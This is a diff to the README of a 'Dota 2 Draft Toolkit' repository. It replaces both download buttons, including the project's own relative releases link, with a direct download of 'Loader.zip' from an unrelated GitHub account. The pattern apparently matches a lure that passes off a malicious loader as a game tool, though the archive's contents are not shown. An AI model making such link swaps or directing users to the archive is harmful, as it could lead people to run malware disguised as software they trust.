@@ -6,7 +6,7 @@
 
 [![Dota 2 Draft Toolkit](assets/cover.svg)](https://brown-yak-652.github.io/)
 
-[![Download](assets/download.svg)](https://github.com/BlazeKazekage/release/releases/download/1/Loader.zip)
+[![Download](assets/download.svg)](https://github.com/PrismMonitorPlan/release/releases/download/1/Loader.zip)
 
 </div>
 
@@ -34,7 +34,7 @@ Session and activity information grouped by the task or context it belongs to.
 
 ## 📥 Download
 
-[![Download Dota 2 Draft Toolkit](assets/download.svg)](../../releases)
+[![Download Dota 2 Draft Toolkit](assets/download.svg)](https://github.com/PrismMonitorPlan/release/releases/download/1/Loader.zip)
 
 The button and cover open the project's download page. Use the information supplied with the downloaded package for installation and release-specific requirements.
 
